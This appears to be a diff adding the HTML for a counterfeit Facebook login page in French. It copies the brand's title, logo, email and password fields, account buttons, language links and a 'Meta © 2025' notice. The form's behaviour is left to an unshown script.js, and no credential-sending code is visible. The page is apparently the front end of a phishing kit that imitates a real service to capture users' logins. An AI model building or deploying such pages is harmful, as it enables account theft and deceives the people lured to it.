@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion - Facebook</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="header">
+        <div class="logo">facebook</div>
+    </div>
+    
+    <div class="container">
+        <div class="login-box">
+            <h1 class="login-title">Se connecter à Facebook</h1>
+            
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="email" placeholder="Adresse e-mail ou numéro de tél." required>
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Mot de passe" required>
+                </div>
+                
+                <button type="submit" class="login-button" id="loginButton">
+                    <span id="buttonText">Se connecter</span>
+                    <div id="loadingSpinner" class="spinner" style="display: none;"></div>
+                </button>
+                
+                <div class="forgot-password">
+                    <a href="#" id="forgotPassword">Mot de passe oublié ?</a>
+                </div>
+                
+                <div class="divider"></div>
+                
+                <div class="create-account">
+                    <button type="button" class="create-account-button" id="createAccount">
+                        Créer nouveau compte
+                    </button>
+                </div>
+            </form>
+        </div>
+        
+        <!-- Message de statut -->
+        <div id="statusMessage" class="status-message" style="display: none;"></div>
+    </div>
+    
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">Français (France)</a>
+            <a href="#">English (US)</a>
+            <a href="#">Español</a>
+            <a href="#">Deutsch</a>
+            <a href="#">Italiano</a>
+            <a href="#">Português (Brasil)</a>
+            <a href="#">العربية</a>
+            <a href="#">हिन्दी</a>
+            <a href="#">中文(简体)</a>
+            <a href="#">日本語</a>
+            <button class="language-button">+</button>
+        </div>
+        
+        <div class="copyright">
+            Meta © 2025
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
